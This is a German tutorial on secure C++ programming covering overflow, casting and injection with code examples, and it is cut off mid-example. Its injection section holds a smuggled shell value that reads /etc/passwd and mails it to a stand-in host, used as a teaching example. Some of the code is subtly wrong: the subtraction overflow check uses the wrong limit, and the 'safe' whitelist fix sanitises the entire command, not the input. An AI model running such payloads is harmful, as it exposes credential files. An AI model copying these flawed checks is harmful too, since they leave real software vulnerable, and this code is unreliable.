# Schutzma�nahmen f�r *Secure Programming*

[Zur�ck](./Readme_Secure_Programming.md)

---

## Inhalt

### Einige wichtige Tipps zum Schreiben von sicherem C++&ndash;Code <!-- Zu den folgende Abschnitten gibt es keinen Quellcode -->

  * [Verwende RAII](#link1)
  * [Verwende *Smart Pointer*](#link2)
  * [Verwende *Exception Handling*](#link3)
  * [Verwende die neuesten C++-Standards](#link4)
  * [Verwende sichere Bibliotheken](#link5)
  * [Verwende starke Typisierung](#link6)

### Einige konkrete Schutzma�nahmen  <!-- Zu den folgende Abschnitten gibt es Quellcode -->

  * [Don't use C &ndash; use C++](#link77)
  * [Verwende mehrere Compiler](#link8)
  * [*Warnings* und *Errors*](#link9)
  * [Warning Level](#link10)
  * [Typensicherheit: Datentypen sind unsere Freunde](#link11)
  * [Erster Tipp f�r Puffer�berlauf: Exaktes Arbeiten](#link12)
  * [Zweiter Tipp f�r Puffer�berlauf: Verwende ausschlie�lich &bdquo;*secure*&rdquo; Funktionen](#link13)
  * [Drei Tipps f�r arithmetischen �berlauf](#link14)
  * [Noch ein Tipp f�r arithmetischen �berlauf: `std::midpoint`](#link15)
  * [Verhindere ung�ltige Zeichenketteninjektionen (so genannte *SQL Injections*)](#link16)
  * [Vermeide &bdquo;*Off-by-One*&rdquo; Fehler!](#link17)
  * [Verwende STL-Algorithmen](#link18)
  * [Verwende STL-Container](#link19)
  * [Achte auf sicheres *Downcasting*](#link20)
  * [Verzichte auf die direkte Verwendung des `new`-Operators](#link21)
  * [Deklariere Konstruktoren mit einem einzigen Argument mit `explicit`](#link22)
  * [Elementare Datentypen haben keine Bedeutung (*Semantics*), nur Wertebereiche](#link23)
  * [Der Datentyp `size_t`](#link24)
  * [Benutzerdefinierte Literale: Elementare Datentypen &bdquo;mit Bedeutung&rdquo;](#link25)
  * [Schl�sselw�rter `virtual`, `override` oder `final`](#link26)
  * [Setze standardm��ig Methoden auf `const`, soweit m�glich](#link27)
  * [Verwende das Attribut `[[nodiscard]]`](#link28)

---

#### Quellcode

[*SecureProgrammingAdvices.cpp*](SecureProgrammingAdvices.cpp)<br />

---

## Einige wichtige Tipps zum Schreiben von sicherem C++&ndash;Code

### Verwenden Sie RAII <a name="link1"></a>

RAII steht f�r *Resource Acquisition Is Initialization* (*Ressourcenerwerb ist Initialisierung*).

Damit m�chte man zum Ausdruck bringen, dass Ressourcen automatisch erworben werden,
wenn ein Objekt erstellt wird, und automatisch freigegeben werden, wenn das Objekt zerst�rt wird.

Verwenden Sie RAII, um Ressourcenlecks und Speicherfehler zu vermeiden.

### Verwende *Smart Pointer* <a name="link2"></a>

C++ *Smart Pointer* k�nnen durchauas mit dem RAII Prinzip verglichen werden.
*Smart Pointer* Objekte verwalten die Speicherzuweisung und -freigabe automatisch.

Verwenden Sie Smart Pointer, um Speicherlecks und &bdquo;dangling&rdquo;&ndash;Zeiger zu vermeiden.


### Verwende *Exception Handling* <a name="link3"></a>

Die Standard C++ Ausnahmebehandlung ist eine M�glichkeit, Fehler und Ausnahmen im laufenden Programm zu behandeln.

Verwenden Sie die Ausnahmebehandlung, um Fehler abzufangen und zu behandeln und zu verhindern,
dass Ihr Programm abst�rzt.

### Verwende die neuesten C++-Standards <a name="link4"></a>

Die neuesten C++-Standards enthalten viele Sicherheitsverbesserungen gegen�ber fr�heren Sprachversionen.

Verwenden Sie immer die neuesten Standards, um diese Verbesserungen zu nutzen.

### Verwende sichere Bibliotheken <a name="link5"></a>

Verwenden Sie sichere Bibliotheken, die auf Sicherheit getestet und verifiziert wurden.

Vermeiden Sie die Verwendung von Bibliotheken von Drittanbietern, die nicht auf Sicherheitsl�cken gepr�ft wurden.

### Verwende starke Typisierung <a name="link6"></a>

Starke Typisierung (*Strong Typing*) stellt sicher, dass Variablen nur f�r den vorgesehenen Zweck verwendet werden.

Vorbei sind die Zeiten, in denen wir mit `void*` die Typpr�fung umgangen haben.

Vorbei sollte auch generell die Praxis sein, mit Hilfe des Castings eine strenge Typpr�fung zu umgehen.

Die unsachgem��e Verwendung von `void*` und Casting kann zum Lesen fehlerhafter Daten f�hren,
was dann auch mit schlechten Intentionen ausgenutzt werden kann.

Verwenden Sie starke Typisierung, um Typangriffe (zum Beispiel durch unsichere Cast-Operationen)
und andere Sicherheitsl�cken zu verhindern.

---

## Einige konkrete Schutzma�nahmen

### Don't use C &ndash; use C++ <a name="link7"></a>

*Beschreibung*:

[CPL.1: Prefer C++ to C](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#cpl1-prefer-c-to-c)

Sollten Sie die Wahl haben: Verwenden Sie C++ und nicht C.

Warum: C++ bietet bessere Typpr�fungsm�glichkeiten und attraktivere M�glichkeiten in der Formulierung von Quellcode.
Es bietet bessere Unterst�tzung f�r die Programmierung auf h�herer Ebene
und generiert h�ufig schnelleren Code.

Diese Aussage findet sich auch in den [C++ Core Guidelines](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines)
wieder: *Prefer C++ to C* (*CPL.1*).

Zur Illustration vergleiche man das Konkatenieren zweier Zeichenketten:
Einmal in C++ geschrieben und ein zweites Mal in C:

*Beispiel*: C++

```cpp
01: std::string first{ "Hello " };
02: std::string second{ "World" };
03: std::string result{ first + second };
04: std::println("{}", result);
```

*Beispiel*: C

```cpp
01: char first[] = "Hello ";
02: char second[] = "World";
03: char result[20];
04: 
05: strcpy_s(result, 20, first);
06: strcat_s(result, 20, second);
07: std::printf("%s\n", result);
```

---

### Verwende mehrere Compiler <a name="link8"></a>

Alle C/++ Compiler �bersetzen lt. Definition C/C++&ndash;Quellcode in Maschinencode.
Dennoch bedeutet das noch lange nicht, dass es hier keine Unterschiede gibt.

Je komplexeren Quellcode Sie schreiben, umso mehr kann es sein, dass ein Compiler ein Programm ohne Warnungen und Fehlermeldungen
akzeptiert und �bersetzt, ein anderer Compiler hingegen mit Warnungen oder im Extremfall sogar mit Fehlermeldungen reagiert.

Es empfiehlt sich daher, eine Code-Basis mit mehreren Compiler �bersetzungsf�hig zu halten.
Dies minimiert m�gliche Nischenprobleme des einen oder anderen �bersetzers.
 
---

### *Warnings* und *Errors* <a name="link9"></a>

Vermutlich durften Sie diesen Hinweis schon oft �ber sich ergehen lassen:
Vermeiden Sie &ndash; so gut es geht &ndash; jegliche Warnungen, die ihr �bersetzer in ihrem Projekt erzeugt.
In den allermeisten F�llen ist eine Warnung ein Hinweis, dass mit Ihrem Quellcode an dieser Stelle etwas nicht in Ordnung ist.
Nehmen Sie Warnungen nicht auf die leichte Schulter:

Eine Kostprobe:

```
Warning C4047 : '=': 'int' differs in levels of indirection from 'int *'
```

Dies wird zwar vom C/C++ Compiler als Warnung eingestuft, es handelt sich hierbei aber um einen beinharten Fehler!

*Bemerkung*:<br />
�ber *Errors* m�ssen wir nicht so viel reden: Bei Vorhandensein von Fehlern ist ein Programm �berhaupt nicht �bersetzungsf�hig!

---

### Warning Level <a name="link10"></a>

Der *Warning Level* gibt an, welche Compilerwarnungen angezeigt werden sollen und welches Warnverhalten w�hrend der gesamten Kompilierung gelten soll.

Je h�her Sie den *Warning Level* einstellen, desto mehr Warnungen werden angezeigt:

<img src="WarningLevel.png" width="700">

*Abbildung* 1: Unterschiedliche *Warning Level* des Visual C++ Compilers.

Sicherlich machen Sie die Beobachtung, dass bei vergleichsweise gro�em Warning Level sehr viele bisweilen pedantische Warnungen erzeugt werden.
Hier muss man sich f�r eine Gratwanderung entscheiden: Ein zu kleiner Warning Level ist schlecht f�r die Qualit�t des Programms,
ein zu gro�er Warning Level kann zu viele Warnungen erzeugen, die nicht unbedingt hilfreich sind.

---

### Typensicherheit: Datentypen sind unsere Freunde <a name="link11"></a>

Eine St�rke der beiden Programmiersprachen C/C++ ist, dass beide das Konzept von &bdquo;Datentypen&rdquo; beherzigen.

  * Man sollte tunlichst vermeiden, mit `void*` einzusetzen bzw. damit eine Typpr�fung zu umgehen.

  * Man sollte die Praxis des *Castings* vermeiden oder nur sehr behutsam einsetzen, um damit eine starke Typpr�fung zu umgehen.

  * Ein Downcasting durch `reinterpret_cast` oder auf der Basis von C-Style-Casting sollte vermieden werden.

  * Entfernen Sie *Constness* nicht mit mit `const_cast` oder mit C-Style-Casting, nur weil Sie es wollen oder der Compiler es erlaubt.

  * C-Style-Casting, Zeiger-Casting und `reinterpret_cast` sind im Allgemeinen riskant und k�nnen eine Quelle f�r ausnutzbare Fehler sein.

  * In diesem Sinne ist es besser, mit starken Typen zu arbeiten!

---

### Erster Tipp f�r Puffer�berlauf: Exaktes Arbeiten <a name="link12"></a>

Wir betrachten diese &ndash; leicht ironische, aber dennoch ernst gemeinte &ndash; Aussage
an einem Beispiel:

*Beispiel*: Einlesen der Kommandozeile - keine optimale L�sung

```cpp
01: void test(int argc, const char* argv[])
02: {
03:     char cmdLine[4096];
04: 
05:     cmdLine[0] = '\0';
06: 
07:     for (int i = 1; i < argc; ++i) {
08:         strcat(cmdLine, argv[i]);
09:         strcat(cmdLine, " ");
10:     }
11: 
12:     std::println("cmdLine: >{}<", cmdLine);
13: }
```

*Beispiel*: Einlesen der Kommandozeile - bessere L�sung

```cpp
01: void evaluateArgs(int argc, const char* argv[])
02: {
03:     size_t bufsize = 0;
04:     size_t buflen = 0;
05: 
06:     char* cmdLine = NULL;
07: 
08:     for (int i = 1; i < argc; ++i) {
09: 
10:         const size_t len = strlen(argv[i]);
11: 
12:         if (bufsize - buflen <= len) {
13: 
14:             bufsize = (bufsize + len) * 2;
15: 
16:             char* ptr = (char*)realloc(cmdLine, bufsize);
17:             if (ptr == NULL) {
18:                 free(cmdLine);
19:                 exit(-1);
20:             }
21: 
22:             cmdLine = ptr;
23:         }
24: 
25:         memcpy(cmdLine + buflen, argv[i], len);
26:         buflen += len;
27:         cmdLine[buflen++] = ' ';
28:     }
29: 
30:     if (cmdLine != NULL) {
31:         cmdLine[buflen] = '\0';
32:     }
33: 
34:     // print created buffer 'cmdLine'
35:     std::println("cmdLine: >{}<", cmdLine);
36: 
37:     free(cmdLine);
38: }
```

*Ausgabe*:

```
cmdLine: >one two three four <
```


---

### Zweiter Tipp f�r Puffer�berlauf: Verwende ausschlie�lich &bdquo;*secure*&rdquo; Funktionen <a name="link13"></a>

*Beispiel*: `strncpy_s`

```cpp
01: void test() {
02: 
03:     char buffer[16];
04: 
05:     const char* str = "This is way too long for this buffer";
06:     std::println("Source:      >{}<", str);
07: 
08:     auto length = strlen(str);
09:     auto size = std::size(buffer);
10: 
11:     // strncpy_s(buffer, size, str, length);      // crashes
12:     strncpy_s(buffer, size, str, size - 1);       //  copy with adjusted boundary
13: 
14:     buffer[size - 1] = '\0';
15:     std::println("Destination: >{}<", buffer);
16: }
```

*Ausgabe*:

```
Source:      >This is way too long for this buffer<
Destination: >This is way too<
```

*Beispiel*: `snprintf`

```cpp
01: void test() {
02: 
03:     constexpr int Size = 64;
04: 
05:     char buffer[Size];
06: 
07:     auto bytesWritten = 0;
08: 
09:     bytesWritten = snprintf(buffer, Size, "The half of %d is %d", 60, 60/2);
10: 
11:     if (bytesWritten >= 0 && bytesWritten < Size) {    // check returned value
12: 
13:         bytesWritten = snprintf(buffer + bytesWritten, Size - bytesWritten, ", and the half of that is %d.", 60/2/2);
14:     }
15: 
16:     std::println("Buffer: >{}< // Bytes written: {}", buffer, bytesWritten);
17: }
```

*Ausgabe*:

```
Buffer: >The half of 60 is 30, and the half of that is 15.< // Bytes written: 29
```

Es gibt f�r die CRT (*C-Runtime Library*) eine �berarbeitung der meisten Funktionen,
um deren Parameter besser �berpr�+fen zu k�nnen:

[Security Features in the CRT](https://learn.microsoft.com/en-us/cpp/c-runtime-library/security-features-in-the-crt?view=msvc-170)


Die Menge aller Modifikationen an den urspr�nglichen Funktionen ist hier beschrieben:

[Security-enhanced versions of CRT functions](https://learn.microsoft.com/en-us/cpp/c-runtime-library/security-enhanced-versions-of-crt-functions?view=msvc-170)


---

## Drei Tipps f�r arithmetischen �berlauf <a name="link14"></a>

F�r den arithmetischen �berlauf kann man &ndash; in einem ersten Ansatz &ndash;
mit gewissen Ad-hoc-L�sungen reagieren.

Ein vollst�ndiger L�sungsansatz findet sich [hier](../SafeInt/Readme_SafeInt.md).

Wir stellen nun drei Workarounds vor, um einen arithmetischen �berlauf zu verhindern.

Im Gro�en und Ganzen kann man sagen, dass man die kritischen Operationen zun�chst vermeiden oder
umgehen muss. Bei der Addition und Subtraktion ist das durchaus m�glich, man kann durch geschicktes Umordnen
des arithmetischen Ausdrucks einen �berlauf verhindern.

Bei der Multiplikation ist das etwas komplizierter. Ein Ansatz besteht darin, auf den n�chstgr��eren Wertebereich umzusteigen,
sofern dies m�glich ist.


*Beispiel*: Addition

```cpp
01: void overflow_addition() {
02: 
03:     std::uint32_t a;
04:     std::uint32_t b;
05:     std::uint32_t sum;
06: 
07:     // ....
08:     sum = a + b;
09: }
10: 
11: void addition_compliant(std::uint32_t a, std::uint32_t b) {
12: 
13:     std::uint32_t sum = 0;
14: 
15:     if (std::numeric_limits<std::uint32_t>::max() - a < b)
16:     {
17:         // test for UIntMax - a < b: handle error condition
18:         std::println("Sum of {} and {} is too large, cannot add !", a, b);
19:     }
20:     else
21:     {
22:         sum = a + b;
23:         std::println("{} + {} = {}", a, b, sum);
24:     }
25: }
26: 
27: void test() {
28: 
29:     // for example
30:     std::uint32_t a = std::numeric_limits<std::uint32_t>::max() / 2;
31:     std::uint32_t b = std::numeric_limits<std::uint32_t>::max() / 2;
32: 
33:     addition_compliant(a, b);
34: }
```



*Beispiel*: Subtraktion

```cpp
01: void overflow_subtraction() {
02: 
03:     std::int32_t a;
04:     std::int32_t b;
05:     std::int32_t sum;
06: 
07:     // ....
08:     sum = a - b;
09: }
10: 
11: void subtraction_compliant(std::int32_t a, std::int32_t b) {
12: 
13:     int32_t result = 0;
14: 
15:     if (b > 0 && a < std::numeric_limits<std::int32_t>::max() + b ||
16:         b < 0 && a > std::numeric_limits<std::int32_t>::max() + b)
17:     {
18:         std::println("Cannot subtract {} from {}! !", b, a);
19:     }
20:     else
21:     {
22:         result = a - b;
23:         std::println("{} - {} = {}", a, b, result);
24:     }
25: }
26: 
27: void test() {
28: 
29:     // for example
30:     std::uint32_t a = std::numeric_limits<std::int32_t>::min() / 2;
31:     std::uint32_t b = std::numeric_limits<std::int32_t>::max() / 2;
32: 
33:     subtraction_compliant(a, b);
34: }
```

*Beispiel*: Multiplikation

```cpp
01: void overflow_multiplication() {
02: 
03:     std::int32_t a;
04:     std::int32_t b;
05:     std::int32_t sum;
06: 
07:     // ....
08:     sum = a * b;
09: }
10: 
11: int32_t multiplication_compliant(std::int32_t a, std::int32_t b) {
12: 
13:     // wanto switch from 32-bit to 64-bit arithmetic
14:     static_assert (sizeof (int64_t) >= 2 * sizeof(int32_t));
15: 
16:     std::int32_t result = 0;
17: 
18:     int64_t product = static_cast<int64_t>(a) * static_cast<int64_t>(b);
19: 
20:     // result needs to be represented as a 32-bit (std::int32_t) integer value (!)
21:     if (product > std::numeric_limits<std::int32_t>::max() || product < std::numeric_limits<std::int32_t>::min()) {
22: 
23:         std::println("Cannot multiply {} with {}! !", a, b);
24:     }
25:     else {
26:         result = static_cast<int32_t>(product);
27:         std::println("{} * {} = {}", a, b, result);
28:     }
29: 
30:     return result;
31: }
32: 
33: void test() {
34: 
35:     // for example
36:     std::int32_t a = 2;
37:     std::int32_t b = 1;
38: 
39:     for (int i = 1; i < 32; ++i) {
40: 
41:         b = multiplication_compliant(a, b);
42:         std::println("{}", b);
43:     }
44: }
```

---

### Noch ein Tipp f�r arithmetischen �berlauf: `std::midpoint` <a name="link15"></a>

Die Funktion `std::midpoint()` berechnet den Mittelpunkt von zwei ganzen Zahlen
oder zwei Gleitkommazahlen:

*Beispiel*:

```cpp
01: void test() {
02: 
03:     std::uint32_t a = std::numeric_limits<std::uint32_t>::max();
04:     std::uint32_t b = std::numeric_limits<std::uint32_t>::max() - 2;
05: 
06:     std::println("a:                                 {}", a);
07:     std::println("b:                                 {}", b);
08:     std::println("Incorrect (overflow and wrapping): {}", (a + b) / 2);
09:     std::println("Correct:                           {}", std::midpoint(a, b));
10: }
```


*Ausgabe*:

```
a:                                 4294967295
b:                                 4294967293
Incorrect (overflow and wrapping): 2147483646
Correct:                           4294967294
```

---

### Verhindere ung�ltige Zeichenketteninjektionen (so genannte *SQL Injections*) <a name="link16"></a>

Das Durchreichen von Zeichenketten an Subsysteme ist mit �u�erster Vorsicht zu bewerkstelligen.

So genannte *SQL-Injections*-Angriffe sind eine der �ltesten Schwachstellen in derartigen Programmen.

Eine SQL-Injection ist eine Art von Sicherheitsl�cke,
bei der ein Angreifer einen Teil des SQL-Codes (*Structured Query Language*) verwendet,
um eine Datenbank zu manipulieren und um Zugriff auf potenziell wertvolle Informationen zu erhalten.
Dies ist eine der h�ufigsten und bedrohlichsten Angriffsarten, da sie potenziell gegen jedes Programm oder jede Webseite eingesetzt werden kann.

Neben SQL-Inkektionen kann die Zeichenkette auch ein (Unix/Linux)-Shell-Kommando darstellen,
was an dieser Stelle ebenfalls einen Angriff darstellt.

*Beispiel*:

```cpp
01: void do_injection(const char* addr) {
02: 
03:     char buffer[256];
04: 
05:     sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
06:     system(buffer);
07: }
08: 
09: void test() {
10:     do_injection("bogus@addr.com; cat /etc/passwd | mail somebadguy.net");
11: }
```

*Ausgabe*:

```
Buffer (Input):   /bin/mail bogus@addr.com; cat /etc/passwd | mail somebadguy.net < /tmp/email
```

*L�sung*:

Jegliche Form eine Benutzereingabe ist zu validieren.

In diesem Zusammenhang gibt es den Begriff der &bdquo;Whitelist&rdquo;:
Hierunter versteht man eine Art  &bdquo;wei�e Liste&rdquo;, eine Art Filter dar,
der die sicheren Daten beschreibt und filtert.

*Beispiel*:

```cpp
01: void clean_input(char* input) {
02: 
03:     static char ok_chars[] =
04:         "abcdefghijklmnopqrstuvwxyz"
05:         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
06:         "1234567890_-@";
07: 
08:     char* begin = input;
09:     char* end = input + strlen(input);
10: 
11:     begin += strspn(begin, ok_chars);
12: 
13:     while (begin != end) {
14:         *begin = '_';
15:         begin += strspn(begin, ok_chars);
16: 
17:     }
18: }
19: 
20: void do_injection_safe(const char* addr) {
21: 
22:     char buffer[256];
23: 
24:     sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
25:     std::println("Buffer (Input):   {}", buffer);
26: 
27:     clean_input(buffer);
28:     std::println("Buffer (Cleaned): {}", buffer);
29: 
30:     system(buffer);
31: }
32: 
33: void test() {
34:     do_injection_safe("bogus@addr.com; cat /etc/passwd | mail somebadguy.net");
35: }
```

Die so genannte  &bdquo;Whitelist&rdquo; finden wir in dem Programmausschnitt
in den Zeilen 4 bis 6 vor: Eine Menge aller zul�ssigen Zeichen in diesem Beispiel.

*Ausgabe*:

```
Buffer (Input):   /bin/mail bogus@addr.com; cat /etc/passwd | mail somebadguy.net < /tmp/email
Buffer (Cleaned): _bin_mail_bogus@addr_com__cat__etc_passwd___mail_somebadguy_net____tmp_email
```


---

### Vermeide &bdquo;*Off-by-One*&rdquo; Fehler! <a name="link17"></a>

Vermeiden Sie &bdquo;*Off-by-One*&rdquo; Fehler!
Nat�rlich ist das leichter getan als gesagt. 

Eine Option besteht &ndash; wenn gleich das f�r das gesamte Spektrum der Entwicklung von Software gilt &ndash; darin,
jede Zeile des Quellcodes mit dem Debugger zu durchlaufen!


*Frage*: Wieviele &bdquo;*Off-by-One*&rdquo; Fehler entdecken Sie in diesem Codefragment:

```cpp
01: void test() {
02: 
03:     char source[10];
04:     strcpy(source, "0123456789");
05: 
06:     char* dest = (char*)malloc(strlen(source));
07:             
08:     int i;
09:     for (i = 1; i <= 11; i++)
10:     {
11:         dest[i] = source[i];
12:     }
13:     dest[i] = '\0';
14: 
15:     std::println("Dest: {}", dest);
16: }
```


---

### Verwende STL-Algorithmen <a name="link18"></a>

Algorithmen der STL sind robuster im Gebrauch als CRT-Bibliotheksfunktionen oder selbst geschriebene Funktionen.

*Beispiel*:

```cpp
01: std::string str{ "Hello World" }; // use also "Hello:World"
02: std::println("{}", str);
03: 
04: auto isColon = [] (int ch) { return ch == ':'; };
05: 
06: auto pos = std::find_if(str.begin(), str.end(), isColon);
07: 
08: // if found - delete everything afterwards
09: if (pos != str.end()) {
10:     str.erase(pos, str.end());
11: }
12: 
13: std::println("{}", str);
```


*Beispiel*:

```cpp
01: char str[] = "Hello World";    // use also "Hello:World"
02: std::printf("%s\n", str);
03: 
04: const char* pos = strstr(str, ":");
05: 
06: if (pos != NULL) {
07: 
08:     // if found - poke '\0' into string - this deletes everything afterwards
09:     size_t ofs = pos - str;
10:     str[ofs] = '\0';
11: }
12: 
13: std::printf("%s\n", str);
```

*Hinweis*:
Vermeiden Sie generell *manuelle* Wiederholungsschleifen!

Verwenden Sie Algorithmen der STL und, wenn es eine Wiederholungsschleife sein muss, die so genannten C++ *Range-based Loop*:
Beide kommen ohne Schleifen-Indizes aus, die eine h�ufige Ursache von Fehlerquellen sind.

---

### Verwende STL-Container <a name="link19"></a>


  * `std::string`
  * `std::vector`

---

### Achte auf sicheres *Downcasting* <a name="link20"></a>

An Stelle der unsicheren C-Cast Operatoren sollten man die sicheren C++-Cast Operatoren verwenden.

Ein Beispiel ist der Gebrauch von `static_cast`:

*Beispiel*:

```cpp
01: class Spiderman {};
02: class Ironman {};
03: 
04: void test() {
05: 
06:     Spiderman* ptr = new Spiderman;
07:     Ironman* ptr2 = nullptr;
08: 
09:     // compile error: 'static_cast': cannot convert from 'Spiderman *' to 'Ironman *'
10:     ptr2 = static_cast<Ironman*>(ptr);
11: }
```

*Beispiel*:

```cpp
01: class Spiderman {};
02: class Ironman {};
03: 
04: void test() {
05: 
06:     Spiderman* ptr = new Spiderman;
07:     Ironman* ptr2 = NULL;
08: 
09:     // compiles (!)
10:     ptr = (Spiderman*) ptr;
11: }
```

---

### Verzichte auf die direkte Verwendung des `new`-Operators <a name="link21"></a>

Siehe hierzu das entsprechende 
[C++ Core Guideline](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines)
mit dem Titel *Avoid calling new and delete explicitly* (*R.11*).

<img src="cpp_security_advice_no_new.svg" width="600">

*Abbildung* 2: `std::unique_ptr`-Variablen haben Charme.


<img src="cpp_security_advice_no_new_gc.svg" width="300">

*Abbildung* 3: Stack-Variablen haben Charme.

Am Ende des Tages stellt sich bei einem mit `new` erzeugten Zeiger immer die Frage:
Wer hat wann und wo `delete` aufgerufen?

---

### Deklariere Konstruktoren mit einem einzigen Argument mit `explicit` <a name="link22"></a>

Standardm��ig sollten Konstruktoren mit einem Argument als  `explicit` deklariert werden.
Damit kann man unbeabsichtige Konvertierungen &ndash; und damit �berraschungen &ndash; vermeiden:

```cpp
01: class String {
02: public:
03:     String(size_t length) : m_length{ length } {};   // Surprise :)
04:     // ...
05: 
06: private:
07:     size_t m_length;
08:     // ...
09: };
10:     
11: void test() {
12: 
13:     String s = '!';  // Uhhh: String of length 33
14: }
```

F�gt man das Schl�sselwort vor dem Konstruktor hinzu, ist die `test`-Funktion nicht mehr �bersetzungf�hig:

```cpp
explicit String(size_t length) : m_length{ length } {}; 
```

---

### Elementare Datentypen haben keine Bedeutung (*Semantics*), nur Wertebereiche <a name="link23"></a>

Ein Datentyp wie `int` hat keine Bedeutung (*Semantik*).

Man kann nicht sagen, dass man das Alter eines Angestellten in einer `Employee`-Klasse mit
dem Typ `int` definieren sollte. `int`-Werte k�nnen sehr gro� sein als auch negativ.
`size_t_`-Werte wiederum sind nicht negativ, aber k�nnen wieder extrem gro�e Werte annehmen.

Es gibt die eine oder andere M�glichkeit, Werte mit einer Semantik zu verbinden:

  * Aufz�hlungstypen (`enum`-Klassen)
  * `std::string` Literale
  * Benutzerdefinierte Literale
  * `size_t`

*Beispiel*: `std::string` Literale

```cpp
01: void test() {
02: 
03:     using namespace std::literals::string_literals;
04: 
05:     auto heroes = { "Spiderman"s, "Ironman"s, "Wonder Woman"s };
06: 
07:     for (auto const& hero : heroes) {
08:         std::println("{:12} ({})", hero, hero.size());
09:     }
10: }
```

`enum`-Klassen sind typsichere Klassen.

*Beispiel*: `enum`-Klassen

```cpp
01: enum class RainbowColors : char
02: {
03:     Violet = 'V',
04:     Indigo = 'I',
05:     Blue   = 'B',
06:     Green  = 'G',
07:     Yellow = 'Y',
08:     Orange = 'O',
09:     Red    = 'R'
10: };
11: 
12: enum class EyeColors
13: {
14:     Blue,
15:     Green,
16:     Brown
17: };
18: 
19: void test() {
20: 
21:     std::cout << static_cast<std::underlying_type_t<RainbowColors>>(RainbowColors::Green) << std::endl;
22:     std::cout << static_cast<std::underlying_type_t<RainbowColors>>(RainbowColors::Orange) << std::endl;
23:     std::cout << static_cast<std::underlying_type_t<EyeColors>>(EyeColors::Blue) << std::endl;
24:     std::cout << static_cast<std::underlying_type_t<EyeColors>>(EyeColors::Green) << std::endl;
25: }
```

*Ausgabe*:

```
G
O
0
1
```

---

### Der Datentyp `size_t` <a name="link24"></a>

Der Name `size_t` bedeutet im Wesentlichen &bdquo;*size type*&rdquo;,
und man verwendet diesen Datentyp normalerweise dann,
um die Gr��e oder L�nge von Dingen anzugeben &ndash; wie beispielsweise die L�nge einer C-Zeichenfolge,
die von der Funktion `strlen()` zur�ckgegeben wird.

`size_t` ist keiner der &bdquo;integrierten&rdquo; Datentypen von C/C++.
Stattdessen wird er im Regelfall in Headerdateien mit `typedef` oder `using` definiert.

Der genaue Datentyp ist implementierungsspezifisch, ist aber normalerweise eine Form eines vorzeichenlosen ganzzahligen Datentyps.

Man sollte `size_t` einsetzen

  * f�r etwaige Gr��enangaben von Objekten
  * f�r Container-�hnliche Objekte und deren Gr��e
  * f�r Array-Indizierung und Schleifenz�hler


---

### Benutzerdefinierte Literale: Elementare Datentypen &bdquo;mit Bedeutung&rdquo; <a name="link25"></a>

In C++ lassen sich `int`-Werte (oder auch Werte anderen Datentyps) durch die so genannte *User Defined Literal* Syntax
erheblich lesbarer gestalten:

*Beispiel*:

```cpp
01: auto h = 23_hours;
02: auto d = 7_days;
03: // auto wrong = h + d;   // doesn't compile: Error
```

Dazu bedarf es der Implementierung des so genannten *Literal*-Operators:

```cpp
01: class Hours{
02: private:
03:     unsigned long long m_hours = 0;
04: 
05: public:
06:     Hours() : Hours(0) {}
07:     explicit Hours (unsigned long long hours) : m_hours(hours) {}
08: };
09:         
10: struct Days {
11: private:
12:     unsigned long long m_hours = 0;
13: 
14: public:
15:     Days() : Days(0) {}
16:     explicit Days(unsigned long long hours) : m_hours(hours) {}
17: };
18: 
19: Hours operator"" _hours(unsigned long long hours) {
20:     return Hours{ hours };
21: }
22: 
23: Days operator"" _days(unsigned long long hours) {
24:     return Days{ hours };
25: }
```

*Hinweis*:<br />
Es ist also nicht m�glich, &bdquo;Stunden&rdquo; und &bdquo;Tage&rdquo; zu addieren.


M�chte man mit derartigen Konstanten auch Arithmetik betreiben k�nnen, geht das auch.
Man muss in diesem Fall die *Literal*-Operatoren nur anders definieren:

```cpp
01: using hours = unsigned long long;
02: 
03: constexpr hours operator"" _hours(unsigned long long hours) {
04:     return hours;
05: }
06: 
07: constexpr hours operator"" _days(unsigned long long hours) {
08:     return hours * 24;
09: }
10: 
11: constexpr hours operator"" _weeks(unsigned long long hours) {
12:     return hours * 7 * 24;
13: }
14: 
15: void test() {
16: 
17:     auto hours = 12_hours;
18:     auto days = 2_days;
19:     auto weeks = 3_weeks;
20:     auto totalHours = weeks + days + hours;
21: }
```

---

### Schl�sselw�rter `virtual`, `override` oder `final` <a name="link26"></a>

Virtuelle Methoden sollten genau eines der drei Schl�sselw�rter `virtual`, `override` oder `final` verwenden.

*Beschreibung*:

[C.128: Virtual functions should specify exactly one of `virtual`, `override`, or `final`](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#c128-virtual-functions-should-specify-exactly-one-of-virtual-override-or-final)

*Beispiel*:

```cpp
01: struct Button {
02:     // ...
03:     virtual void onClick() { 
04:         std::println("Button!");
05:     }
06: };
07: 
08: struct SuperButton : public Button {
09:     // ...
10:     void onClick() override {
11:         std::println("Super Button!");
12:     }
13: };
14: 
15: void test() {
16:     Button button;
17:     button.onClick();
18: 
19:     SuperButton superButton;
20:     superButton.onClick();
21: }
```

---

### Setze standardm��ig Methoden auf `const`, soweit m�glich <a name="link27"></a>

*Beschreibung*:

[Con.2: By default, make member functions `const`](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#con2-by-default-make-member-functions-const)

*Beispiel*:

```cpp
01: class Point {
02: private:
03:     int m_x = 0;
04:     int m_y = 0;
05: 
06: public:
07:     Point() : Point{ 0, 0 } {};
08:     Point(int x, int y) : m_x{ x }, m_y{ y } {}
09: 
10:     int x() const { return m_x; }
11:     int y() const { return m_y; }
12: 
13:     bool is_valid() const {
14:         return m_x >= 0 && m_y >= 0;
15:     }
16: };
17: 
18: void test() {
19:     Point point;
20:     point.is_valid();
21: }
```

---

### Verwende das Attribut `[[nodiscard]]` <a name="link28"></a>

*Beschreibung*:

Die Idee von `[[nodiscard]]` ist, dass, wenn es nur dann sinnvoll ist, eine Funktion/Methode aufzurufen *und*
ihren R�ckgabewert zu �bernehmen, f�r Aufrufe dieser Funktion ohne Zuweisung des R�ckgabewerts ein Programmierfehler gemeldet wird.

Die Annotation `[[nodiscard]]` hilft Programmierern, die mit Ihrem Code interagieren, diesen Fehler zu vermeiden.

*Beispiel*:

```cpp
01: class Point {
02: private:
03:     int m_x = 0;
04:     int m_y = 0;
05: 
06: public:
07:     Point() : Point{ 0, 0 } {};
08:     Point(int x, int y) : m_x{ x }, m_y{ y } {}
09: 
10:     int x() const { return m_x; }
